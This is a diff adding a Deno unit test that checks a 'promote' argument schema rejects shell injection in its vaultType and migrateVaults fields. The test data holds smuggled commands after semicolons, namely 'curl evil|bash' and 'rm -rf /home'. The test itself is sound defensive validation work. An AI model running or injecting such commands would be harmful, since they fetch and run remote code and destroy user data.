@@ -218,6 +218,34 @@ Deno.test("assertHostname accepts a MagicDNS name, rejects injection", () => {
   assertThrows(() => assertHostname("has space.ts.net", "magicDnsName"));
 });
 
+Deno.test("promote args reject shell injection in vaultType and migrateVaults", () => {
+  const promoteArgs = model.methods.promote.arguments;
+  // vaultType with a command separator must be rejected.
+  assertEquals(
+    promoteArgs.safeParse({
+      migrateVaults: ["gitlab"],
+      vaultType: "@zts/aws-ssm; curl evil|bash",
+    }).success,
+    false,
+  );
+  // A migrateVaults element with a separator must be rejected.
+  assertEquals(
+    promoteArgs.safeParse({
+      migrateVaults: ["ok", "my-vault; rm -rf /home"],
+      vaultType: "@zts/aws-ssm",
+    }).success,
+    false,
+  );
+  // Legitimate values validate.
+  assertEquals(
+    promoteArgs.safeParse({
+      migrateVaults: ["gitlab", "anthropic"],
+      vaultType: "@zts/aws-ssm",
+    }).success,
+    true,
+  );
+});
+
 Deno.test("datastoreType and metachar fields reject shell injection", () => {
   const schema = model.globalArguments;
   const base = { adminPrincipal: "user:a", tokenVault: "v" };
